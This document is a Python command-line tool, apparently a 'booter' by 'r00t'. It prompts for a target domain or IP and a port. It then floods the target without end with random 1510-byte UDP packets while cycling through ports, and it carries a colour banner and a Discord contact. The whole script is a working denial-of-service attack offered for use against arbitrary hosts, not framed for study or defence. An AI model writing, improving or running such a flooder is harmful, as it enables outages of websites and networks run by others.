from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back
colorama.init()
banner=Fore.MAGENTA+'''
██████╗  █████╗  █████╗ ████████╗   ██████╗ ██╗   ██╗
██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝   ██╔══██╗╚██╗ ██╔╝
██████╦╝██║  ██║██║  ██║   ██║      ██████╔╝ ╚████╔╝
██╔══██╗██║  ██║██║  ██║   ██║      ██╔═══╝   ╚██╔╝
██████╦╝╚█████╔╝╚█████╔╝   ██║      ██╗        ██║
╚═════╝  ╚════╝  ╚════╝    ╚═╝ ██   ╚═╝        ╚═╝   

	    Needed: python3  
	     Author: r00t                
'''+Fore.RESET
uname=system()
if uname== "Windows":
	cmd='cls'
else :
	cmd='clear'
os.system(cmd)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1510)

def chech_con():
	try:
		request.urlopen('https://www.google.com/',timeout=3)
	except KeyboardInterrupt:
		print(Fore.RED + "Stopped" + Fore.RESET)
		exit()
	except:
		print(Fore.MAGENTA+'Lost connection.'+Fore.RESET)
		exit()
try:
	chech_con()
	os.system(cmd)
except KeyboardInterrupt:
	print(Fore.RED + "Currently has been stopped by user" + Fore.RESET)
	exit()
try:
	while True:
		print(banner)
		print(Fore.WHITE+"1. Website\n2. IP\n3. Help\n4. Quit"+Fore.RESET)
		opt=str(input(Fore.WHITE+"\nChoose: "+Fore.RESET))
		if opt=='1':
			domain=str(input(Fore.WHITE+"'assetbump.me' Example: "+Fore.RESET))
			ip=socket.gethostbyname(domain)
			break
		elif opt=='2':
			ip = input(Fore.WHITE+"IP: "+Fore.RESET)
			break
		elif opt=='3':
			print(Fore.WHITE+"Message me via discord ко#0898"+Fore.RESET)
			exit()
		elif opt=='4':
			time.sleep(1)
			print(Fore.RED+"Aww sad to see you go, Come back soon!"+Fore.RESET)
			exit()
		else:
			print(Fore.RED+'Aww shit now thats an Error!'+Fore.RESET)
			time.sleep(2)
			os.system(cmd)
	port =int(input(Fore.WHITE+"Default Port 80: "+Fore.RESET))
	os.system(cmd)
	sent = 0
except Exception as e:
	print(Fore.RED+"Awww crap something went wrong.")
	print("Reason:",e,Fore.RESET)
	exit()
try:
	while True:
		sock.sendto(bytes, (ip,port))
		sent=sent+1
		port=port+1
		print(Fore.WHITE+ "%s packets to %s ports between: %s" % (sent, ip, port))
		if port==65534:
			port=1
		elif port==1900:
			port=1901
except Exception as e:
	print(Fore.RED+"Exited\nReason: ",e,Fore.RESET)
except KeyboardInterrupt:
	print(Fore.RED+"\nStopped by User"+Fore.RESET)
